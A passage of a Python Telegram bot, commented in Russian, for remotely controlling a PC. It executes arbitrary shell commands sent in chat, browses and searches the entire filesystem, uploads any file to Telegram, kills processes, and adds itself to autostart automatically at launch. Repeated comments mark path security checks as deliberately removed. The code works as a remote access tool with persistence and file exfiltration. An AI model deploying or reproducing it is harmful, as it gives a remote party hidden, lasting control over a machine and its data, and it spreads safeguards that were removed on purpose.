                        except OSError:
                            pass
                    else:
                        self.bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown')

            elif subcommand == 'find':
                if len(parts) < 3:
                    self.bot.reply_to(message, "❌ Использование: /files find <шаблон>")
                    return

                pattern_str = parts[2]
                try:
                    # Поиск по всей файловой системе
                    if pattern_str.startswith('/') or ':' in pattern_str:
                        # Абсолютный путь
                        search_path = Path(pattern_str).parent
                        pattern = Path(pattern_str).name
                    else:
                        # Относительный путь - ищем от корня
                        search_path = Path('/') if os.name == 'posix' else Path('C:\\')
                        pattern = pattern_str

                    recursive = '**' in pattern_str
                    files = glob.glob(str(search_path / pattern), recursive=recursive)
                    
                    safe_files = []
                    for f in files:
                        p = Path(f).resolve(strict=False)
                        safe_files.append(str(p))

                    if safe_files:
                        display_files = safe_files[:20]
                        response = f"🔍 Найдено {len(safe_files)} файлов:\n\n" + "\n".join(display_files)
                        if len(safe_files) > 20:
                            response += f"\n\n... и еще {len(safe_files) - 20}"
                        self.bot.reply_to(message, response)
                    else:
                        self.bot.reply_to(message, f"❌ Файлы по шаблону '{pattern_str}' не найдены")
                except Exception as e:
                    logger.exception("Ошибка поиска файлов")
                    self.bot.reply_to(message, f"❌ Ошибка поиска: {str(e)}")

            elif subcommand == 'cd':
                if len(parts) < 3:
                    self.bot.reply_to(message, "❌ Использование: /files cd <путь>")
                    return

                new_path_str = parts[2]
                new_path = Path(new_path_str)

                if not new_path.is_absolute():
                    new_path = current_dir / new_path

                new_path = new_path.resolve(strict=False)

                # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                if new_path.is_dir():
                    self.sessions.set_working_dir(user_id, new_path)
                    self.bot.reply_to(message, f"✅ Текущая директория: `{new_path}`", parse_mode='Markdown')
                else:
                    self.bot.reply_to(message, f"❌ Директория не существует: {new_path}")

            elif subcommand == 'pwd':
                self.bot.reply_to(message, f"📁 Текущая директория: `{current_dir}`", parse_mode='Markdown')

            elif subcommand == 'download':
                if len(parts) < 3:
                    self.bot.reply_to(message, "❌ Использование: /files download <путь_к_файлу>")
                    return

                file_path_str = parts[2]
                file_path = Path(file_path_str).resolve(strict=False)
                
                # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                success, result_msg = self._send_file_to_telegram(message.chat.id, file_path, user_id)
                self.bot.reply_to(message, result_msg)

            else:
                self.bot.reply_to(message, f"❌ Неизвестная подкоманда: {subcommand}")

        except Exception as e:
            logger.exception("_handle_files")
            self.bot.reply_to(message, f"❌ Ошибка при работе с файлами: {str(e)}")

    def _handle_cmd(self, message: Message) -> None:
        """Обработчик команды /cmd"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        user_id = message.from_user.id

        self.sessions.cmd_sessions[user_id] = {
            "active": True,
            "current_dir": self.sessions.get_working_dir(user_id),
            "last_message_id": None
        }

        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔴 Завершить сессию", callback_data="cmd_stop"))

        current_dir = self.sessions.cmd_sessions[user_id]['current_dir']
        welcome_msg = self.bot.send_message(
            message.chat.id,
            f"🖥️ Интерактивная командная строка\n📁 Текущая директория: `{current_dir}`\n\nВведите команду:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )

        self.sessions.cmd_sessions[user_id]['last_message_id'] = welcome_msg.message_id
        self.sessions.command_sessions[user_id] = "cmd"

    def _handle_autostart_on(self, message: Message) -> None:
        """Обработчик команды /autostart_on"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        success, result_msg = self.system_manager.add_to_autostart()
        self.bot.reply_to(message, result_msg)

    def _handle_autostart_off(self, message: Message) -> None:
        """Обработчик команды /autostart_off"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        success, result_msg = self.system_manager.remove_from_autostart()
        self.bot.reply_to(message, result_msg)

    def _handle_autostart_status(self, message: Message) -> None:
        """Обработчик команды /autostart_status"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        success, result_msg = self.system_manager.check_autostart()
        self.bot.reply_to(message, result_msg)

    def _handle_cmd_command(self, message: Message) -> None:
        """Обработчик команд в сессии CMD"""
        user_id = message.from_user.id

        if user_id not in self.sessions.cmd_sessions or not self.sessions.cmd_sessions[user_id]['active']:
            self.bot.reply_to(message, "❌ Сессия CMD не активна. Используйте /cmd для начала новой сессии.")
            return

        command = message.text.strip()
        current_dir = self.sessions.cmd_sessions[user_id]['current_dir']

        if self.security.is_dangerous_command(command):
            response = "🚫 Выполнение этой команды заблокировано из соображений безопасности"
        else:
            if command.startswith('cd '):
                new_path_str = command[3:].strip()
                try:
                    new_path = Path(new_path_str)

                    if not new_path.is_absolute():
                        new_path = current_dir / new_path

                    new_path = new_path.resolve(strict=False)

                    # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                    if new_path.is_dir():
                        self.sessions.cmd_sessions[user_id]['current_dir'] = new_path
                        self.sessions.set_working_dir(user_id, new_path)
                        response = f"✅ Текущая директория изменена на: `{new_path}`"
                    else:
                        response = f"❌ Директория не существует: {new_path}"
                except OSError as e:
                    logger.exception("Ошибка смены директории в CMD")
                    response = f"❌ Ошибка при смене директории: {str(e)}"
            else:
                try:
                    # Выполняем команду и собираем вывод
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=Config.COMMAND_TIMEOUT,
                        encoding='cp866',
                        cwd=str(current_dir)
                    )

                    output = ""
                    if result.returncode != 0:
                        output += f"Exit code: {result.returncode}\n"
                    if result.stderr:
                        output += f"STDERR:\n{result.stderr}\n\n"
                    if result.stdout:
                        output += f"STDOUT:\n{result.stdout}"
                    if not output:
                        output = "Команда выполнена успешно (нет вывода)"

                    # Если вывод очень большой (>4000) — отправим файл с полным выводом, а в чате — первые 4000 символов
                    if len(output) > 4000:
                        preview = output[:4000] + "\n... (вывод обрезан — полный вывод отправлен файлом)"
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", prefix="cmd_out_") as tmpf:
                            tmpf.write(output.encode('utf-8', errors='ignore'))
                            tmpf.flush()
                            tmpf_path = Path(tmpf.name)
                        # отправляем превью и файл
                        response = f"```\n{preview}\n```"
                        try:
                            self.bot.send_message(message.chat.id, response, parse_mode='Markdown')
                            with tmpf_path.open('rb') as fobj:
                                self.bot.send_document(message.chat.id, fobj, caption=f"💾 Полный вывод: {command[:50]}")
                        except Exception:
                            logger.exception("Ошибка при отправке вывода команды как файла")
                        finally:
                            try:
                                tmpf_path.unlink()
                            except OSError:
                                pass
                        # Send current_dir and command info separately
                        self.bot.send_message(
                            message.chat.id,
                            f"📁 `{current_dir}`\n💻 `{command}`",
                            parse_mode='Markdown'
                        )
                        return
                    else:
                        response = f"```\n{output}\n```"

                except subprocess.TimeoutExpired:
                    response = f"❌ Таймаут выполнения команды ({Config.COMMAND_TIMEOUT} сек)"
                except OSError as e:
                    logger.exception("Ошибка выполнения команды в CMD")
                    response = f"❌ Ошибка выполнения: {str(e)}"

        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔴 Завершить сессию", callback_data="cmd_stop"))

        try:
            response_msg = self.bot.send_message(
                message.chat.id,
                f"📁 `{current_dir}`\n💻 `{command}`\n\n{response}",
                parse_mode='Markdown',
                reply_markup=keyboard
            )
            self.sessions.cmd_sessions[user_id]['last_message_id'] = response_msg.message_id
        except Exception:
            logger.exception("Ошибка отправки сообщения CMD")

    def _stop_cmd_session(self, user_id: int, chat_id: int) -> None:
        """Завершение сессии CMD"""
        if user_id in self.sessions.cmd_sessions:
            self.sessions.cmd_sessions[user_id]['active'] = False
            del self.sessions.cmd_sessions[user_id]

        if user_id in self.sessions.command_sessions:
            del self.sessions.command_sessions[user_id]

        self.bot.send_message(chat_id, "🔴 Сессия командной строки завершена")

    def _handle_callback(self, call) -> None:
        """Обработчик callback запросов"""
        try:
            if not self._is_admin(call.from_user.id):
                self.bot.answer_callback_query(call.id, "⛔ Нет доступа")
                return

            user_id = call.from_user.id
            data = call.data or ""

            # Скачивание файлов
            if data.startswith("DOWNLOAD:"):
                encoded_path = data.split(":", 1)[1]
                file_path = self.path_encoder.decode(encoded_path)

                if not file_path:
                    self.bot.answer_callback_query(call.id, "❌ Файл не найден или устарел")
                    return

                # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                self.bot.answer_callback_query(call.id, "📥 Отправка файла...")

                success, result_msg = self._send_file_to_telegram(call.message.chat.id, file_path, user_id)
                if not success:
                    self.bot.send_message(call.message.chat.id, result_msg)
                return

            # Переход в папку
            if data.startswith("FOLDER:"):
                encoded_path = data.split(":", 1)[1]
                folder_path = self.path_encoder.decode(encoded_path)

                if not folder_path:
                    self.bot.answer_callback_query(call.id, "❌ Папка не найдена или устарела")
                    return

                # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                self.sessions.set_working_dir(user_id, folder_path)

                items, error = self.file_manager.list_directory(folder_path)

                if error:
                    self.bot.send_message(call.message.chat.id, error)
                else:
                    # Сохраняем список файлов в сессии для пагинации
                    self.sessions.file_browser_sessions[user_id] = {
                        "items": items,
                        "current_path": folder_path,
                        "page": 0
                    }

                    keyboard = self._generate_file_keyboard(items, 0, folder_path)
                    total_pages = (len(items) - 1) // Config.PAGE_SIZE + 1
                    page_info = f" (стр. 1/{total_pages})" if total_pages > 1 else ""
                    response = f"📁 {folder_path}\n\nНажмите на файл для скачивания или папку для перехода{page_info}"

                    try:
                        self.bot.edit_message_text(
                            response,
                            call.message.chat.id,
                            call.message.message_id,
                            reply_markup=keyboard
                        )
                    except Exception:
                        # Если редактирование не удалось, отправляем новое сообщение
                        self.bot.send_message(call.message.chat.id, response, reply_markup=keyboard)

                self.bot.answer_callback_query(call.id)
                return

            # Пагинация файлов
            if data.startswith("FILE_PAGE:"):
                parts = data.split(":", 2)
                page = int(parts[1])
                encoded_path = parts[2]
                folder_path = self.path_encoder.decode(encoded_path)

                if not folder_path:
                    self.bot.answer_callback_query(call.id, "❌ Путь не найден или устарел")
                    return

                # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                session = self.sessions.file_browser_sessions.get(user_id)

                # Если сессия существует и путь совпадает, используем сохраненный список
                if session and session["current_path"] == folder_path:
                    items = session["items"]
                else:
                    # Иначе загружаем список заново
                    items, error = self.file_manager.list_directory(folder_path)
                    if error:
                        self.bot.answer_callback_query(call.id, error)
                        return
                    self.sessions.file_browser_sessions[user_id] = {
                        "items": items,
                        "current_path": folder_path,
                        "page": page
                    }

                keyboard = self._generate_file_keyboard(items, page, folder_path)
                total_pages = (len(items) - 1) // Config.PAGE_SIZE + 1
                page_info = f" (стр. {page+1}/{total_pages})" if total_pages > 1 else ""
                response = f"📁 {folder_path}\n\nНажмите на файл для скачивания или папку для перехода{page_info}"

                try:
                    self.bot.edit_message_text(
                        response,
                        call.message.chat.id,
                        call.message.message_id,
                        reply_markup=keyboard
                    )
                except Exception:
                    pass

                self.bot.answer_callback_query(call.id)
                return

            # Завершение сессии CMD
            if data == "cmd_stop":
                self._stop_cmd_session(call.from_user.id, call.message.chat.id)
                self.bot.answer_callback_query(call.id, "Сессия завершена")
                return

            # Диспетчер задач
            if data.startswith("KILL:"):
                pid = int(data.split(":")[1])
                token = secrets.token_hex(8)
                self.sessions.pending_kills[token] = {
                    "pid": pid,
                    "chat_id": call.message.chat.id
                }

                keyboard = InlineKeyboardMarkup()
                keyboard.row(
                    InlineKeyboardButton("✅ Подтвердить", callback_data=f"CONFIRM:{token}"),
                    InlineKeyboardButton("❌ Отмена", callback_data=f"CANCEL:{token}")
                )

                self.bot.send_message(call.message.chat.id, f"⚠️ Подтвердите завершение процесса PID {pid}", reply_markup=keyboard)
                self.bot.answer_callback_query(call.id)
                return

            if data.startswith("CONFIRM:"):
                token = data.split(":")[1]
                info = self.sessions.pending_kills.pop(token, None)

                if info:
                    pid = info["pid"]
                    success, result_msg = self.process_manager.kill_process(pid)
                    self.bot.send_message(call.message.chat.id, result_msg)

                self.bot.answer_callback_query(call.id, "✅ Выполнено")
                return

            if data.startswith("CANCEL:"):
                token = data.split(":")[1]
                info = self.sessions.pending_kills.pop(token, None)

                if info:
                    self.bot.send_message(call.message.chat.id, f"❌ Завершение процесса PID {info['pid']} отменено")

                self.bot.answer_callback_query(call.id, "❌ Отменено")
                return

            # Навигация по страницам
            if data.startswith("PAGE:"):
                parts = data.split(":")
                page = int(parts[1])
                sort_mode = parts[2]

                session = self.sessions.task_manager_sessions.get(call.message.chat.id)
                if session:
                    processes = session["filtered"]
                    keyboard = self._generate_process_keyboard(processes, page, sort_mode)
                    session["page"] = page

                    try:
                        self.bot.edit_message_reply_markup(
                            call.message.chat.id,
                            call.message.message_id,
                            reply_markup=keyboard
                        )
                    except Exception:
                        pass

                self.bot.answer_callback_query(call.id)
                return

            # Сортировка процессов
            if data.startswith("SORT:"):
                sort_mode = data.split(":")[1]
                session = self.sessions.task_manager_sessions.get(call.message.chat.id)

                if session:
                    processes = session["filtered"]

                    if sort_mode == "cpu":
                        processes.sort(key=lambda x: float(x.get("cpu_percent") or 0.0), reverse=True)
                    elif sort_mode == "mem":
                        processes.sort(key=lambda x: (x.get("memory_info").rss if x.get("memory_info") else 0), reverse=True)

                    session["filtered"] = processes
                    session["page"] = 0
                    session["sort"] = sort_mode

                    keyboard = self._generate_process_keyboard(processes, 0, sort_mode)

                    try:
                        self.bot.edit_message_reply_markup(
                            call.message.chat.id,
                            call.message.message_id,
                            reply_markup=keyboard
                        )
                    except Exception:
                        pass

                self.bot.answer_callback_query(call.id)
                return

            # Поиск процессов
            if data == "SEARCH":
                self.sessions.search_sessions[call.message.chat.id] = True
                self.bot.send_message(call.message.chat.id, "🔍 Введите имя процесса для поиска:", reply_markup=ForceReply())
                self.bot.answer_callback_query(call.id)
                return

            # Сброс фильтров
            if data == "RESET":
                session = self.sessions.task_manager_sessions.get(call.message.chat.id)

                if session:
                    processes = self.process_manager.gather_processes()
                    processes.sort(key=lambda x: x.get("pid") or 0)

                    session["filtered"] = processes
                    session["page"] = 0
                    session["sort"] = "pid"

                    keyboard = self._generate_process_keyboard(processes, 0, "pid")

                    try:
                        self.bot.edit_message_reply_markup(
                            call.message.chat.id,
                            call.message.message_id,
                            reply_markup=keyboard
                        )
                    except Exception:
                        pass

                    self.bot.send_message(call.message.chat.id, "🔄 Фильтр сброшен, показаны все процессы")

                self.bot.answer_callback_query(call.id)
                return

        except Exception:
            logger.exception("_handle_callback")
            try:
                self.bot.answer_callback_query(call.id, "❌ Ошибка обработки")
            except Exception:
                pass

    def _handle_search(self, message: Message) -> None:
        """Обработчик поиска процессов"""
        search_term = message.text.strip().lower()
        self.sessions.search_sessions.pop(message.chat.id, None)

        session = self.sessions.task_manager_sessions.get(message.chat.id)
        if not session:
            return

        all_processes = self.process_manager.gather_processes()
        filtered_processes = [proc for proc in all_processes if search_term in (proc.get("name") or "").lower()]

        if not filtered_processes:
            self.bot.send_message(message.chat.id, f"❌ Процессы по запросу '{search_term}' не найдены")
            return

        session["filtered"] = filtered_processes
        session["page"] = 0

        keyboard = self._generate_process_keyboard(filtered_processes, 0, session.get("sort", "pid"))
        self.bot.send_message(
            message.chat.id,
            f"🔍 Результаты поиска по '{search_term}' — {len(filtered_processes)} процессов",
            reply_markup=keyboard
        )

    def _handle_text_messages(self, message: Message) -> None:
        """Обработчик текстовых сообщений"""
        if not self._is_admin(message.from_user.id):
            return

        if message.text and message.text.startswith('/'):
            return

        user_id = message.from_user.id

        if user_id in self.sessions.command_sessions and self.sessions.command_sessions[user_id] == "cmd":
            self._handle_cmd_command(message)
            return

        self.bot.reply_to(message, "❓ Неизвестная команда. Используйте /start для списка команд")

    def run(self) -> None:
        """Запуск бота"""
        logger.info("🖥️ Бот управления ПК запущен...")
        # Автоматическое добавление в автозагрузку
        self.system_manager.auto_add_to_autostart()
        logger.info("📱 Используйте Telegram для управления")

        try:
            self.bot.infinity_polling()
        except Exception:
            logger.exception("❌ Ошибка бота")
            input("Нажмите Enter для выхода...")

    def shutdown(self) -> None:
        """Остановить фоновые потоки"""
        try:
            ProcessManager.stop_background()
        except Exception:
            logger.exception("Ошибка shutdown")


def main():
    """Основная функция"""
    bot = TelegramBot()
    try:
        bot.run()
    finally:
        bot.shutdown()


if __name__ == "__main__":
    main()
